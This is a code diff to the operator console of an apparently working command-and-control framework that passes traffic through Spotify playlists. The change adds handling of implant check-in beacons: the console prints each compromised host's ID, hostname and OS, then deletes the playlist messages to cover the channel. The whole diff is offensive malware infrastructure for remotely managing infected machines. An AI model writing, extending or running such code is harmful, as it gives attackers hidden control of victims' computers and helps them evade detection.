@@ -93,6 +93,13 @@ class Operator:
             try:
                 payload = proto.reassemble_payload(chunk_metas)
                 result = proto.decode_message(payload, self.key)
+                # Handle checkin beacon (seq=0, module=checkin)
+                if result.get('module') == 'checkin':
+                    self._display_checkin(result)
+                    self.spotify.clean_c2_playlists(
+                        proto.CHANNEL_RES, self.key, seq=seq_num
+                    )
+                    continue
                 results[seq_num] = result
                 self.spotify.clean_c2_playlists(
                     proto.CHANNEL_RES, self.key, seq=seq_num
@@ -201,6 +208,28 @@ class Operator:
                 self._print_status()
             else:
                 print(f"[!] Unknown command: {cmd}. Type 'help'.")
+
+    def _display_checkin(self, result: dict):
+        """Display an implant check-in notification."""
+        data = result.get('data', '{}')
+        try:
+            info = json.loads(data)
+        except json.JSONDecodeError:
+            info = {}
+        client_id = info.get('client_id', '????????')
+        hostname = info.get('hostname', 'unknown')
+        os_info = info.get('os', 'unknown')
+        ts = result.get('ts', time.time())
+        timestamp = time.strftime(
+            '%Y-%m-%d %H:%M:%S', time.localtime(ts)
+        )
+        print(
+            f"\n[+] New implant connected!"
+            f"\n    client_id : {client_id}"
+            f"\n    hostname  : {hostname}"
+            f"\n    os        : {os_info}"
+            f"\n    timestamp : {timestamp}\n"
+        )
 
     def _display_result(self, seq: int, result: dict):
         """Pretty-print a result."""
